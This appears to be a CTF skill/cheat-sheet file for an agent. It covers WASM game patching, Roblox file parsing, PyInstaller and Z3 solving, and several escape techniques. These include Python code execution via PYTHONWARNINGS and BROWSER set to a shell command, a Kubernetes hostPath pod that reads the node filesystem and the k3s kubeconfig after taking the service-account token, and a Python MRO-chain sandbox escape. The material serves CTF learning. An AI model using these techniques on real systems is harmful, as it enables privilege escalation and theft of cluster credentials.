---
name: misc-games-vms
description: "CTF misc games and VMs. WASM game AI weakening via wasm2wat patching, Roblox version history binary format parsing, PyInstaller extraction with opcode remapping, Python marshal code analysis, Python environment RCE via PYTHONWARNINGS, Z3 constraint solving for custom VMs, YARA rules with Z3, Kubernetes RBAC bypass via hostPath pod, floating-point precision exploitation with large multipliers, custom assembly sandbox escape via Python MRO chain, memfd_create packed binary RC4 decryption. Triggers: 'wasm game patch', 'roblox forensics', 'pyinstaller opcode', 'python marshal', 'pythonwarnings rce', 'z3 vm solving', 'kubernetes rbac pod escape', 'floating point exploit', 'custom assembly sandbox', 'game theory ctf', 'memfd create'."
---

# CTF Misc: Games, VMs & Constraint Solving

WASM patching, Roblox forensics, PyInstaller, Z3, K8s escape, FP precision.

---

## Phase 1: WASM Game AI Weakening

```bash
# Pattern: unbeatable WASM AI: patch to play badly, keep valid proofs

wasm2wat main.wasm -o main.wat

# Find minimax: initial bestScore = -1000 → change to 1000
# Flip comparison: i64.lt_s → i64.gt_s (selects worst moves)

wat2wasm main.wat -o main_patched.wasm
```

```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
for (const m of [0, 3, 6]) { PlayerMove(m); }
const data = GetWinData();
// Submit data.moves and data.proof to server → valid!
```

---

## Phase 2: Roblox Place File Reversing

```bash
# Extract target IDs from game page HTML
placeId=75864087736017
universeId=8920357208

# Pull versions via Asset Delivery API (.ROBLOSECURITY cookie required):
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${placeId}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

```python
# Parse .rbxlbin: INST (class buckets), PROP (per-instance properties), PRNT (parent-child tree)
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
# Diff v1/v2/v3: latest version often has decoy flag
```

---

## Phase 3: PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Output in packed.exe_extracted/
```

```python
# Opcode remapping (when decompiler fails):
# 1. Find modified opcode.pyc in extracted dir
# 2. Build mapping to original opcode values
# 3. Patch target .pyc bytecodes
# 4. Decompile with uncompyle6 or decompile3

import marshal, dis
with open('file.pyc', 'rb') as f:
    f.seek(16)  # skip magic + timestamp + size
    code = marshal.load(f)
dis.dis(code)
print(code.co_consts)  # literal values
print(code.co_names)   # referenced names
```

---

## Phase 4: Python Environment RCE

```bash
# Dangerous env vars when restricted Python execution is available:
PYTHONWARNINGS=ignore: antigravity.Foo: 0
BROWSER="/bin/sh -c 'cat /flag' %s"

# PYTHONWARNINGS triggers import antigravity → opens URL via $BROWSER
# Other vectors:
PYTHONSTARTUP=/path/to/script    # executed on interactive startup
PYTHONPATH=/writable/dir          # path hijacking for module injection
PYTHONINSPECT=1                   # drop to interactive after script
```

---

## Phase 5: Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # known prefix
# Reverse VM operations → add each as Z3 constraint:
s.add(flag[0] ^ flag[1] == 0x42)
s.add(flag[2] + flag[3] == 0x85)
s.add(And(flag[0] >= 0x20, flag[0] <= 0x7e))

if s.check() == sat:
    model = s.model()
    print(bytes([model[f].as_long() for f in flag]))
```

```python
# Type system constraints (OCaml GADTs):
import re
from z3 import *
matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 BitVec constraints and solve
```

---

## Phase 6: Kubernetes RBAC Bypass via hostPath

```bash
# Deploy probe pod reading in-pod ServiceAccount token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Check permissions:
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag

# If pod creation allowed: mount hostPath /  → read node filesystem
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
spec:
  containers:
  - image: alpine
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Extract kubeconfig from node:
cat /host/etc/rancher/k3s/k3s.yaml

# Checklist:
# kubectl auth can-i --list
# Check for pod creation permissions
# Check for secrets in env vars of other pods
```

---

## Phase 7: Floating-Point Precision Exploitation

```python
# Pattern: large multiplier amplifies float64 precision errors

mult = 1000000000000000  # 10^15

def find_exploit(balance, price, fee):
    for i in range(1, 500):
        x = i / 100.0
        if x >= balance:
            break
        inv_after = x * mult
        bal_after = (balance - x) * mult
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell
        if final_bal >= price * mult and final_inv >= fee:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  balance={final_bal}, inventory={final_inv}')
            return x
    return None

# Common exploitable values: 0.07, 0.14, 0.27, 0.56
# 0.56 * 1e15 = 560000000000000.0625 (positive fraction)
# Sell int part, keep fraction as "free inventory"
```

---

## Phase 8: Custom Assembly / Python MRO Chain RCE

```python
# Pattern: custom instruction set running on Python backend
# PROP (property access) + CALL (function invocation) → MRO chain traversal

# Any string → __class__.__base__.__subclasses__() → RCE
# Subclass index 138 ≈ os._wrap_close (varies by Python version)

# Bypass "flag" keyword filter with hex-encoded strings:
# 0x666c61672e747874 = "flag.txt"
# 0x5f5f6275696c74696e735f5f = "__builtins__"

# Exploit chain (custom VM instructions pseudocode):
# LD string_object → PROP __class__ → PROP __base__ → PROP __subclasses__
# → CALL → IDX 138 → PROP __init__ → PROP __globals__
# → CALL __getitem__ with hex("__builtins__") → CALL open with hex("flag.txt")
# → CALL read → STDOUT
```

---

## Phase 9: memfd_create Packed Binary

```python
from Crypto.Cipher import ARC4

cipher = ARC4.new(b"key")  # key from binary strings
decrypted = cipher.decrypt(encrypted_data)
open("dumped_binary", "wb").write(decrypted)
# Then analyze dumped binary normally
```

---

## Output

Save to `.omop/engagement/ctf/misc/`:
- `solution.py`: solver script
- `flag.txt`: found flag

## Next Phase

→ `ctf-misc-games-vms-2` for ML weight negation, Flask cookie leakage, Brainfuck, WASM memory
→ `ctf-misc-bashjails` for shell escape techniques
→ `ctf-misc-pyjails` for Python jail escapes
